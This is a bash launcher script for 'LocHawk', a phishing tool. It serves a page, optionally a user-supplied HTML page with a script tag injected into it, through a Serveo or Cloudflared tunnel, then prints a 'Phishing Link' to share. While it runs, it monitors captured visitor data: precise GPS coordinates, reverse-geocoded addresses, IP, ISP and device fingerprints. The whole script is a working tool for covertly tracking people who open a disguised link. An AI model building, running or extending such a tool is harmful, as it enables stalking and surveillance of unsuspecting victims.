#!/usr/bin/env bash

# Colors
GREEN="\e[1;32m"
RED="\e[1;31m"
BLUE="\e[1;34m"
YELLOW="\e[1;33m"
CYAN="\e[1;36m"
RESET="\e[0m"

# Variables
SERVER_PORT=3000
SERVER_PID=""
TUNNEL_PID=""
PHISHING_URL=""
TUNNEL_CHOICE=""
USE_CUSTOM_HTML=""
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TEMPLATES_DIR="${SCRIPT_DIR}/template1"
DATA_FILE="${SCRIPT_DIR}/data.txt"

# Banner
banner() {
 clear
 echo -e "${YELLOW}"
 cat << "EOF" 
    _                _    _                _    
   | |              | |  | |              | |   
   | |     ___   ___| |__| | __ ___      _| | __
   | |    / _ \ / __|  __  |/ _` \ \ /\ / / |/ /
   | |___| (_) | (__| |  | | (_| |\ V  V /|   < 
   |______\___/ \___|_|  |_|\__,_| \_/\_/ |_|\_\
                                                                                                                                      
                             Developer : Sreeraj

EOF
 echo -e "${GREEN}* GitHub: https://github.com/s-r-e-e-r-a-j\n${RESET}"
}

# Install Dependencies
install_dependencies() {
    echo -e "${YELLOW}[+] Checking dependencies...${RESET}"

    # Detect package manager
    if command -v apt-get &>/dev/null; then
        PKG_INSTALL="sudo apt-get install -y"
        UPDATE_CMD="sudo apt-get update"
    elif command -v yum &>/dev/null; then
        PKG_INSTALL="sudo yum install -y"
        UPDATE_CMD="sudo yum update -y"
    elif command -v dnf &>/dev/null; then
        PKG_INSTALL="sudo dnf install -y"
        UPDATE_CMD="sudo dnf update -y"
    elif command -v pacman &>/dev/null; then
        PKG_INSTALL="sudo pacman -S --noconfirm"
        UPDATE_CMD="sudo pacman -Syu"
    else
        echo -e "${RED}[-] No supported package manager found! Please install dependencies manually.${RESET}"
        return 1
    fi

    $UPDATE_CMD

    if ! command -v node &>/dev/null; then
        echo -e "${RED}[-] Node.js is not installed! Installing...${RESET}"
        $PKG_INSTALL nodejs
    fi

    if ! command -v npm &>/dev/null; then
        echo -e "${RED}[-] npm is not installed! Installing...${RESET}"
        $PKG_INSTALL npm
    fi

    if ! command -v lsof &>/dev/null; then
        echo -e "${RED} [-] lsof is not installed! Installing...${RESET}"
        $PKG_INSTALL lsof
    fi

    if ! command -v ssh &>/dev/null; then
        echo -e "${RED}[-] OpenSSH client is not installed! Installing...${RESET}"
        $PKG_INSTALL openssh-client || $PKG_INSTALL openssh
    fi

    # Check if express is installed in the project directory
    if [[ ! -d "node_modules/express" ]]; then
        echo -e "${RED}[-] Express.js is not installed! Installing...${RESET}"
        npm install express
    fi

    if ! command -v cloudflared &>/dev/null; then
        echo -e "${RED}[-] Cloudflared is not installed! Installing...${RESET}"
        sudo wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared
        sudo chmod +x /usr/local/bin/cloudflared
    fi

    echo -e "${GREEN}[+] All dependencies are installed!${RESET}"
}

create_needed_files() {
      touch server.log 2>/dev/null
      touch cloudflared.txt 2>/dev/null
      touch serveo.txt 2>/dev/null
      # Ensure data.txt exists and has proper permissions
      touch "${DATA_FILE}" 2>/dev/null
      chmod 644 "${DATA_FILE}" 2>/dev/null
}

# Kill Any Existing Server on Port 3000
kill_old_server() {
    OLD_PID=$(lsof -ti :$SERVER_PORT)
    if [[ ! -z "$OLD_PID" ]]; then
        echo -e "${YELLOW}[+] Killing old server running on port $SERVER_PORT...${RESET}"
        kill -9 $OLD_PID
        echo -e "${GREEN}[+] Old server stopped!${RESET}"
    fi
}

select_html_file() {
    echo -ne "${CYAN}[+] Enter the path to the custom HTML file (or press Enter to use the default): ${RESET}"
    read HTML_PATH

   
    if [[ -n "$HTML_PATH" && -f "$HTML_PATH" ]]; then
        cp "$HTML_PATH" "${TEMPLATES_DIR}/index.html"
        
        # Inject script tag before closing body tag
         sed -i '/<\/body>/i <script src="script.js"></script>' "${TEMPLATES_DIR}/index.html"
  
         echo -e "${GREEN}[+] Custom HTML copied and script.js injected${RESET}"
         USE_CUSTOM_HTML=true
    else
        echo -e "${YELLOW}[+] Using default HTML page.${RESET}"
        USE_CUSTOM_HTML=false
    fi
}

set_permissions() {
    # Get absolute path of the script
    SCRIPT_PATH="$(readlink -f "$0")"
   
    # Go one level up from script directory to get the main LocHawk directory
    SCRIPT_DIR="$(dirname "$SCRIPT_PATH")"
    MAIN_DIR="$(dirname "$SCRIPT_DIR")"

    # Get current user, directory owner and group
    CURRENT_USER="$(whoami)"
    DIR_OWNER="$(stat -c '%U' "$MAIN_DIR" 2>/dev/null || echo "")"
    DIR_GROUP="$(stat -c '%G' "$MAIN_DIR" 2>/dev/null || echo "")"

    # If user is not owner and not in group OR cannot write -> fix access
    if [[ ! -w "$MAIN_DIR" ]] || ([[ -n "$DIR_OWNER" && -n "$DIR_GROUP" && "$CURRENT_USER" != "$DIR_OWNER" ]] && ! id -nG "$CURRENT_USER" 2>/dev/null | grep -qw "$DIR_GROUP"); then

        if [[ "$EUID" -eq 0 ]]; then
            # Running as root -> restore ownership to the original user
            TARGET_USER="${SUDO_USER:-$(logname 2>/dev/null || echo root)}"
            chown -R "$TARGET_USER":"$TARGET_USER" "$MAIN_DIR" 2>/dev/null
            chmod -R u+rwx "$MAIN_DIR" 2>/dev/null

        else
            # Running as normal user -> grant access safely
            chmod -R u+rwX "$MAIN_DIR" 2>/dev/null
        fi

        # Final fallback if still not writable
        [[ -w "$MAIN_DIR" ]] || chmod -R 777 "$MAIN_DIR" 2>/dev/null
    fi

}

# Start the Node.js Server
start_server() {
    echo -e "${YELLOW}[+] Starting LocHawk Server...${RESET}"
    
    if [[ "$USE_CUSTOM_HTML" = true ]]; then
        node server1.js > server.log 2>&1 &
    else
        node server.js > server.log 2>&1 &
    fi
    SERVER_PID=$!
    sleep 2

    if ps -p $SERVER_PID > /dev/null 2>&1; then
        echo -e "${GREEN}[+] Server started successfully!${RESET}"
    else
        echo -e "${RED}[-] Server failed to start!${RESET}"
        cat server.log
        exit 1
    fi
}

# Tunnel Selection Menu
select_tunnel() {
    echo -e "${YELLOW}[+] Select a tunnel:${RESET}"
    echo -e "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m ${BLUE}Serveo.net${RESET}"
    echo -e "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m ${BLUE}Cloudflared${RESET}"
    echo -e "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m ${BLUE}Localhost${RESET}"

    echo -ne "${GREEN}[+] Enter choice (1, 2 or 3):${RESET} "
    read choice

    case $choice in
        1) TUNNEL_CHOICE="serveo" ;;
        2) TUNNEL_CHOICE="cloudflared" ;;
        3) TUNNEL_CHOICE="localhost" ;;
        *) echo -e "${RED}[-] Invalid choice! Defaulting to Serveo.net.${RESET}"
           TUNNEL_CHOICE="serveo"
        ;;
    esac
}

# Start Serveo.net Tunneling
start_serveo() {
    echo -e "${YELLOW}[+] Starting Serveo.net tunnel...${RESET}"
    ssh -o StrictHostKeyChecking=no -R 80:localhost:$SERVER_PORT serveo.net > serveo.txt 2>&1 &
    TUNNEL_PID=$!
    
    for i in {1..10}; do
        sleep 2
        if grep -q "Forwarding HTTP traffic" serveo.txt 2>/dev/null; then
            PHISHING_URL=$(grep -oE "https?://[a-zA-Z0-9.-]+\.serveousercontent.com" serveo.txt | head -1)
            if [[ ! -z "$PHISHING_URL" ]]; then
                echo -e "${GREEN}[+] Phishing Link: ${PHISHING_URL}${RESET}"
                return
            fi
        fi
    done
    
    echo -e "${RED}[-] Serveo failed!${RESET}"
    stop_server
    exit 1
}

# Start Cloudflared Tunneling 
start_cloudflared() {
    echo -e "${YELLOW}[+] Starting Cloudflared tunnel...${RESET}"
    cloudflared tunnel --url "http://localhost:$SERVER_PORT" > cloudflared.txt 2>&1 &
    TUNNEL_PID=$!
    
    # Wait for Cloudflared to generate the link properly
    for i in {1..15}; do
        PHISHING_URL=$(grep -oE "https://[a-zA-Z0-9.-]+\.trycloudflare.com" cloudflared.txt 2>/dev/null | head -1)
        if [[ ! -z "$PHISHING_URL" ]]; then
            echo -e "${GREEN}[+] Phishing Link: ${PHISHING_URL}${RESET}"
            return
        fi
        sleep 1
    done

    echo -e "${RED}[-] Cloudflared failed to start!${RESET}"
    stop_server
    exit 1
}

start_localhost() {

    PHISHING_URL="http://localhost:$SERVER_PORT"

    echo -e "${GREEN}[+] Localhost server running!${RESET}"
    echo -e "${CYAN}[+] Server Port : ${SERVER_PORT}${RESET}"
    echo -e "${GREEN}[+] Local Testing URL:${RESET}"
    echo -e "${CYAN}${PHISHING_URL}${RESET}"

    echo
    echo -e "${YELLOW}[+] If using VPS or external tunnel, forward this port:${RESET}"
    echo -e "${CYAN}localhost:${SERVER_PORT}${RESET}"
}

# Monitor for Received Data
monitor_data() {
    echo -e "${GREEN}[+] Monitoring for incoming data (Ctrl+C to stop)...${RESET}"
    echo -e "${GREEN}[+] Data saved to: ${DATA_FILE}${RESET}\n"
    
    # Display existing data
    if [[ -f "${DATA_FILE}" && -s "${DATA_FILE}" ]]; then
        echo -e "${GREEN}[+] Previous data:${RESET}"
        tail -20 "${DATA_FILE}" 2>/dev/null | while read line; do
            if [[ ! -z "$line" ]]; then
                format_location_data "$line"
                echo -e "${GREEN}---${RESET}"
            fi
        done
    fi
    
    # Monitor new data
    tail -f "${DATA_FILE}" 2>/dev/null | while read line; do
        if [[ ! -z "$line" ]]; then
            echo -e "\n${GREEN}[+] New data received at $(date '+%H:%M:%S'):${RESET}"
            format_location_data "$line"
            echo -e "${GREEN}---${RESET}"
        fi
    done
}

# Function to format location data
format_location_data() {
    local line="$1"
    
    # Extract basic info
    local ts=$(echo "$line" | grep -o '"ts":"[^"]*"' | cut -d'"' -f4)
    local ip=$(echo "$line" | grep -o '"ip":"[^"]*"' | grep -v '"ip":""' | head -n1 | cut -d'"' -f4)
    local type=$(echo "$line" | grep -o '"type":"[^"]*"' | cut -d'"' -f4)
    
    # Format timestamp
    if [[ ! -z "$ts" ]]; then
        local formatted_time="$(echo "$ts" | cut -d'T' -f1) $(echo "$ts" | cut -d'T' -f2 | cut -d'.' -f1)"
        echo -e "${GREEN}time =${RESET} ${GREEN}$formatted_time${RESET}"
    fi
    
    if [[ ! -z "$ip" ]]; then
        echo -e "${GREEN}ip =${RESET} ${GREEN}$ip${RESET}"
    fi
    
    if [[ ! -z "$type" ]]; then
        echo -e "${GREEN}type =${RESET} ${GREEN}$type${RESET}"
    fi
    
    # Handle different data types
    case "$type" in
        "device")
            local ua=$(echo "$line" | grep -o '"ua":"[^"]*"' | cut -d'"' -f4)
            local platform=$(echo "$line" | grep -o '"pl":"[^"]*"' | cut -d'"' -f4)
            local cookies=$(echo "$line" | grep -o '"ce":\(true\|false\)' | cut -d':' -f2)
            local language=$(echo "$line" | grep -o '"bl":"[^"]*"' | cut -d'"' -f4)
            local browser_name=$(echo "$line" | grep -o '"bn":"[^"]*"' | cut -d'"' -f4)
            local browser_code=$(echo "$line" | grep -o '"bc":"[^"]*"' | cut -d'"' -f4)
            local ram=$(echo "$line" | grep -o '"rm":[0-9]*' | cut -d':' -f2)
            local cores=$(echo "$line" | grep -o '"cc":[0-9]*' | cut -d':' -f2)
            local sw=$(echo "$line" | grep -o '"sw":[0-9]*' | cut -d':' -f2)
            local sh=$(echo "$line" | grep -o '"sh":[0-9]*' | cut -d':' -f2)
            local referrer=$(echo "$line" | grep -o '"rf":"[^"]*"' | cut -d'"' -f4)
            local os_raw=$(echo "$line" | grep -o '"os":"[^"]*"' | cut -d'"' -f4)
            
            # Detect browser from UA
            local browser="Unknown"
            if [[ "$ua" == *"Chrome"* ]] && [[ "$ua" != *"Edg"* ]]; then
                browser="Chrome"
            elif [[ "$ua" == *"Firefox"* ]]; then
                browser="Firefox"
            elif [[ "$ua" == *"Safari"* ]] && [[ "$ua" != *"Chrome"* ]]; then
                browser="Safari"
            elif [[ "$ua" == *"Edg"* ]]; then
                browser="Edge"
            fi
            
            # Detect OS from UA
            local os="Unknown"
            if [[ "$ua" == *"Windows"* ]]; then
                os="Windows"
            elif [[ "$ua" == *"Mac OS"* ]] || [[ "$ua" == *"macOS"* ]]; then
                os="macOS"
            elif [[ "$ua" == *"iPhone"* ]] || [[ "$ua" == *"iPad"* ]]; then
                os="iOS"
            elif [[ "$ua" == *"Android"* ]]; then
                os="Android"
            elif [[ "$ua" == *"Linux"* ]]; then
                os="Linux"
            fi
            
            # Print ALL fields 
            echo -e "${GREEN}browser =${RESET} ${GREEN}$browser${RESET}"
            echo -e "${GREEN}browser_name =${RESET} ${GREEN}$browser_name${RESET}"
            echo -e "${GREEN}browser_code =${RESET} ${GREEN}$browser_code${RESET}"
            echo -e "${GREEN}os =${RESET} ${GREEN}$os${RESET}"
            echo -e "${GREEN}os_raw =${RESET} ${GREEN}$os_raw${RESET}"
            echo -e "${GREEN}platform =${RESET} ${GREEN}$platform${RESET}"
            echo -e "${GREEN}language =${RESET} ${GREEN}$language${RESET}"
            echo -e "${GREEN}cookies_enabled =${RESET} ${GREEN}$cookies${RESET}"
            echo -e "${GREEN}ram =${RESET} ${GREEN}${ram}GB${RESET}"
            echo -e "${GREEN}cores =${RESET} ${GREEN}$cores${RESET}"
            echo -e "${GREEN}screen =${RESET} ${GREEN}${sw}x${sh}${RESET}"
            echo -e "${GREEN}referrer =${RESET} ${GREEN}$referrer${RESET}"
            ;;
            
        "gps"|"location")
            # Extract GPS coordinates
            local lat=$(echo "$line" | grep -o '"lat":[0-9.-]*' | cut -d':' -f2)
            local lng=$(echo "$line" | grep -o '"lng":[0-9.-]*' | cut -d':' -f2)
            local acc=$(echo "$line" | grep -o '"acc":[0-9.]*' | cut -d':' -f2)
            
            if [[ ! -z "$lat" && ! -z "$lng" ]]; then
                echo -e "${GREEN}latitude =${RESET} ${GREEN}$lat${RESET}"
                echo -e "${GREEN}longitude =${RESET} ${GREEN}$lng${RESET}"
                
                if [[ ! -z "$acc" ]]; then
                    echo -e "${GREEN}accuracy =${RESET} ${GREEN}${acc}m${RESET}"
                fi
                
                # Google Maps link
                local maps_link="https://www.google.com/maps?q=$lat,$lng"
                echo -e "${GREEN}Google Maps link =${RESET} ${GREEN}$maps_link${RESET}"
                
                # Try to get address
                if command -v curl &>/dev/null; then
                    local address=$(curl -s "https://nominatim.openstreetmap.org/reverse?format=json&lat=$lat&lon=$lng" | grep -o '"display_name":"[^"]*"' | cut -d'"' -f4 | head -1)
                    if [[ ! -z "$address" ]]; then
                        echo -e "${GREEN}address =${RESET} ${GREEN}$address${RESET}"
                    fi
                fi
            fi
            ;;
            
        "network")
            local country=$(echo "$line" | grep -o '"country":"[^"]*"' | cut -d'"' -f4)
            local city=$(echo "$line" | grep -o '"city":"[^"]*"' | cut -d'"' -f4)
            local net_lat=$(echo "$line" | grep -o '"lat":[0-9.-]*' | cut -d':' -f2)
            local net_lon=$(echo "$line" | grep -o '"lon":[0-9.-]*' | cut -d':' -f2)
            local isp=$(echo "$line" | grep -o '"isp":"[^"]*"' | cut -d'"' -f4)
            
            echo -e "${GREEN}country =${RESET} ${GREEN}$country${RESET}"
            echo -e "${GREEN}city =${RESET} ${GREEN}$city${RESET}"
            echo -e "${GREEN}isp =${RESET} ${GREEN}$isp${RESET}"
            
            if [[ ! -z "$net_lat" && ! -z "$net_lon" ]]; then
                echo -e "${GREEN}network_lat =${RESET} ${GREEN}$net_lat${RESET}"
                echo -e "${GREEN}network_lon =${RESET} ${GREEN}$net_lon${RESET}"
                local net_link="https://www.google.com/maps?q=$net_lat,$net_lon"
                echo -e "${GREEN}Google Maps link =${RESET} ${GREEN}$net_link${RESET}"
            fi
            ;;
            
        "ip")
            local ip_addr=$(echo "$line" | grep -o '"ip":"[^"]*"' | grep -v '"ip":""' | head -n1 | cut -d'"' -f4)
            echo -e "${GREEN}public_ip =${RESET} ${GREEN}$ip_addr${RESET}"
            ;;
            
        "geo_error")
            local error_code=$(echo "$line" | grep -o '"code":[0-9]*' | cut -d':' -f2)
            local error_msg=$(echo "$line" | grep -o '"msg":"[^"]*"' | cut -d'"' -f4)
            echo -e "${GREEN}geo_error_code =${RESET} ${GREEN}$error_code${RESET}"
            echo -e "${GREEN}geo_error_msg =${RESET} ${GREEN}$error_msg${RESET}"
            ;;
            
        "error")
            local error_msg=$(echo "$line" | grep -o '"msg":"[^"]*"' | cut -d'"' -f4)
            echo -e "${GREEN}error =${RESET} ${GREEN}$error_msg${RESET}"
            ;;
    esac
}


# Stop the Server
stop_server() {
    echo -e "\n${YELLOW}[+] Stopping LocHawk server...${RESET}"
    [[ ! -z "$SERVER_PID" ]] && kill $SERVER_PID 2>/dev/null && echo -e "${GREEN}[+] Server stopped!${RESET}"
    [[ ! -z "$TUNNEL_PID" ]] && kill $TUNNEL_PID 2>/dev/null && echo -e "${GREEN}[+] Tunnel stopped!${RESET}"
    
    rm -f template1/index.html

    echo -e "${YELLOW}[+] Do you want to clear the data file (data.txt)? (y/n): ${RESET}"
    read -t 10 choice || echo ""
    case $choice in
         y|Y|yes|YES)
           if [[ -f "${DATA_FILE}" ]]; then
                 > "${DATA_FILE}" # clear the file
                 echo -e "${GREEN} [+] Data file cleared successfully!${RESET}"
           else
                echo -e "${RED} Data file not found!${RESET}"
           fi
           ;;

         n|N|no|NO)
            echo -e "[+]${BLUE} Data file preserved at ${DATA_FILE}${RESET}"
            ;;
    esac

    exit 0
}

# Trap Ctrl+C to stop the server
trap stop_server SIGINT SIGTERM

# Run the script
banner
install_dependencies
create_needed_files
banner
kill_old_server
select_html_file
set_permissions
start_server
select_tunnel

if [[ "$TUNNEL_CHOICE" == "serveo" ]]; then
    start_serveo
elif [[ "$TUNNEL_CHOICE" == "cloudflared" ]]; then
    start_cloudflared
else
    start_localhost
fi

if [[ "$TUNNEL_CHOICE" != "localhost" ]]; then
    echo -e "\n${CYAN}[+] Share this URL: ${PHISHING_URL}${RESET}"
fi

echo -e "${YELLOW}[+] Press Ctrl+C to stop${RESET}\n"

monitor_data
